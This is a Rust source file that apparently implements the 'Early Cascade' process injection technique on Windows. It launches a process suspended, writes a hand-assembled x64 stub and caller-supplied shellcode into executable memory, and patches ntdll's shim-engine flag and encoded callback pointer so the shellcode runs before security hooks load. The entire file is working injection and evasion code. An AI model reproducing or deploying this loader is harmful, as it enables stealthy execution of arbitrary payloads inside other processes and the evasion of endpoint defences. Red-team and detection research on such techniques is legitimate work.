use core::mem::zeroed;
use std::{ffi::CString, os::raw::c_void, ptr::null_mut};

use ntapi::ntpsapi::NtQueueApcThread;
use shared::{check, utils::dbj2_hash};
use windows_sys::Win32::{Foundation::CloseHandle, System::{Diagnostics::Debug::WriteProcessMemory, Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE}, Threading::{CreateProcessA, ResumeThread, CREATE_SUSPENDED, PROCESS_INFORMATION, STARTUPINFOA, STARTUPINFOEXA}}};



pub unsafe fn run(process_name: String, shellcode: Vec<u8>) {

    let mut cascade_stub_x64 = [
        0x48_u8, 0x83, 0xec, 0x38,                       // sub rsp, 38h
        0x33, 0xc0,                                      // xor eax, eax
        0x45, 0x33, 0xc9,                                // xor r9d, r9d
        0x48, 0x21, 0x44, 0x24, 0x20,                    // and [rsp+38h+var_18], rax
    
        0x48, 0xba,                                      // 
        0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88, 0x88,  // mov rdx, 8888888888888888h
    
        0xa2,                                            // (offset: 25)
        0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99,  // mov ds:9999999999999999h, al
    
        0x49, 0xb8,                                      // 
        0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77,  // mov r8, 7777777777777777h
    
        0x48, 0x8d, 0x48, 0xfe,                          // lea rcx, [rax-2]
    
        0x48, 0xb8,                                      // 
        0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66,  // mov rax, 6666666666666666h
    
        0xff, 0xd0,                                      // call rax
        0x33, 0xc0,                                      // xor eax, eax
        0x48, 0x83, 0xc4, 0x38,                          // add rsp, 38h
        0xc3                                             // retn
    ];

    let mut process_info: PROCESS_INFORMATION = zeroed();
    let mut startup_info: STARTUPINFOA = zeroed();
    startup_info.cb = core::mem::size_of::<STARTUPINFOA>() as u32;

    let app_path = CString::new(process_name.clone()).unwrap();

    let status = CreateProcessA(
        app_path.as_ptr() as *const u8,
        null_mut(),
        null_mut(),
        null_mut(),
        false as i32,
        CREATE_SUSPENDED,
        null_mut(),
        null_mut(),
        &mut startup_info,
        &mut process_info,
    );
    check!(status != 0);

    let sec_mr_data_base = shared::ntpeb::ldr_module_section_base(dbj2_hash(b"ntdll.dll"), b".mrdata");
    let sec_data_base = shared::ntpeb::ldr_module_section_base(dbj2_hash(b"ntdll.dll"), b".data");
    
    // let g_shims_enabled = sec_data_base.offset(0x7194) as *mut u8;
    // let g_pfnse_dll_loaded = sec_mr_data_base.offset(0x268) as *mut u8;
    let g_shims_enabled = sec_data_base.offset(0x6cf0) as *mut u8;
    let g_pfnse_dll_loaded = sec_mr_data_base.offset(0x270) as *mut u8;

    // assert_eq!(*g_shims_enabled, 0);

    println!("g_shims_enabled: {:p}", g_shims_enabled);
    println!("g_pfnse_dll_loaded: {:p}", g_pfnse_dll_loaded);

    // shared::utils::breakpoint();

    let memory = VirtualAllocEx(
        process_info.hProcess,
        null_mut(),
        cascade_stub_x64.len() + shellcode.len(),
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    );

    let shellcode_entry = memory.add(cascade_stub_x64.len());
    cascade_stub_x64[16..24].copy_from_slice(&(shellcode_entry as u64).to_le_bytes());

    cascade_stub_x64[25..33].copy_from_slice(&(g_shims_enabled as u64).to_le_bytes());

    cascade_stub_x64[35..43].copy_from_slice(&(0_u64).to_le_bytes());

    let nt_queue_apc_thread = NtQueueApcThread as u64;
    cascade_stub_x64[49..57].copy_from_slice(&nt_queue_apc_thread.to_le_bytes());

    let status = WriteProcessMemory(
        process_info.hProcess,
        memory,
        cascade_stub_x64.as_ptr() as *const c_void,
        cascade_stub_x64.len(),
        null_mut()
    );
    check!(status != 0);

    let status = WriteProcessMemory(
        process_info.hProcess,
        memory.add(cascade_stub_x64.len()),
        shellcode.as_ptr() as *const c_void,
        shellcode.len(),
        null_mut()
    );
    check!(status != 0);

    // shared::utils::breakpoint();

    // patch g_shims_enabled
    let flag = 1_u8;
    let status = WriteProcessMemory(
        process_info.hProcess,
        g_shims_enabled as *mut c_void,
        &flag as *const u8 as *const c_void,
        size_of::<u8>(),
        null_mut()
    );
    check!(status != 0);

    // patch g_pfnse_dll_loaded
    let shared_user_cookie = *(0x7FFE0330 as *const u32);
    let target_addr = memory as usize;
    let xored = target_addr ^ (shared_user_cookie as usize);
    let final_value = xored.rotate_right(shared_user_cookie & 0x3F);

    let status = WriteProcessMemory(
        process_info.hProcess,
        g_pfnse_dll_loaded as *mut c_void,
        &final_value as *const usize as *const c_void,
        size_of::<usize>(),
        null_mut()
    );
    check!(status != 0);

    // shared::utils::breakpoint();

    let status = ResumeThread(process_info.hThread);
    check!(status != 0);


    CloseHandle(process_info.hProcess);
    CloseHandle(process_info.hThread);

}